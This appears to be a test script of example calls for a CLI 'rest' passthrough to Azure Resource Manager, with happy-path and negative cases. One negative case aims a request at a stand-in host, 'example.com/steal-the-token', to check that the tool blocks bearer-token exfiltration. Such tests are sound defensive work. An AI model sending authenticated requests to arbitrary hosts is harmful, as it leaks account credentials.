# Universal REST passthrough - CLI
# Equivalent of: az rest --method GET --uri <url>
#
# Prereq: azv2 login (so the {subscriptionId} token and ARM auth resolve).

# Happy path: relative ARM path. {subscriptionId} is substituted from the auth context,
# the ARM endpoint (https://management.azure.com) is prepended, and the request is
# authenticated automatically. Expect HTTP 200 + a JSON list of resource groups.
rest `
    --method GET `
    --uri "/subscriptions/{subscriptionId}/resourcegroups?api-version=2021-04-01"

# Happy path: absolute URL passes through unchanged (still ARM-authenticated).
rest `
    --method GET `
    --uri "https://management.azure.com/subscriptions/282bb33f-067d-4179-a7a4-b833c13af735/resourcegroups/cirrus-test-group-1?api-version=2021-04-01"

# Happy path with explicit headers (space-separated KEY=VALUE).
rest `
    --method GET `
    --uri "/subscriptions/{subscriptionId}/resourcegroups?api-version=2021-04-01" `
    --headers Accept=application/json

# Happy path: ByParameters mode collection GET. Instead of a full URL, supply the ARM resource-id
# pieces and an api-version; the command builds the subscription-wide provider collection URL
# https://management.azure.com/subscriptions/{sub}/providers/Microsoft.Storage/storageAccounts for
# you. This lists all Storage accounts in the subscription (an empty "value" array is still a 200).
rest `
    --resource-provider Microsoft.Storage `
    --resource-type storageAccounts `
    --api-version 2021-09-01

# Happy path: ByParameters mode single-resource GET. Supplying --resource-group builds the
# /subscriptions/{sub}/resourceGroups/{name} segment, which is the correct ARM path for a single
# resource group; this fetches the cirrus-test-group-1 resource group (Expect 200).
rest `
    --resource-group cirrus-test-group-1 `
    --api-version 2021-04-01

# Happy path: extra query-string parameters via --uri-parameters (space-separated KEY=VALUE). Here
# $top limits the number of resource groups returned. Works in both URI and ByParameters modes.
rest `
    --method GET `
    --uri "/subscriptions/{subscriptionId}/resourcegroups?api-version=2021-04-01" `
    --uri-parameters '$top=3'

# Negative case: an unsupported HTTP method must be rejected with a clear message.
rest `
    --method FOO `
    --uri "/subscriptions/{subscriptionId}/resourcegroups?api-version=2021-04-01"

# Negative case: the URI form and the piece-wise ByParameters flags are mutually exclusive; supplying
# both must be rejected before any request is sent.
rest `
    --uri "/subscriptions/{subscriptionId}/resourcegroups?api-version=2021-04-01" `
    --resource-provider Microsoft.Resources `
    --api-version 2021-04-01

# Negative case: ByParameters mode requires an api-version; omitting it must be rejected.
rest `
    --resource-provider Microsoft.Resources `
    --resource-type resourceGroups

# Negative case: an HTTP error (>= 400) must surface the body AND cause a non-zero CLI exit so
# scripts using set -e / $? can detect it. This GET targets a resource group that does not exist
# and is expected to return 404; the full RestResponse (status/headers/body) is still printed.
rest `
    --method GET `
    --uri "/subscriptions/{subscriptionId}/resourcegroups/this-rg-does-not-exist-404?api-version=2021-04-01"

# Negative case: an absolute URL pointing at a non-ARM host must be REJECTED before any request is
# sent, so the ARM bearer token is never leaked to an arbitrary destination (token exfiltration).
rest `
    --method GET `
    --uri "https://example.com/steal-the-token"

# Negative case: an absolute http:// (non-https) ARM URL must be rejected.
rest `
    --method GET `
    --uri "http://management.azure.com/subscriptions/{subscriptionId}/resourcegroups?api-version=2021-04-01"
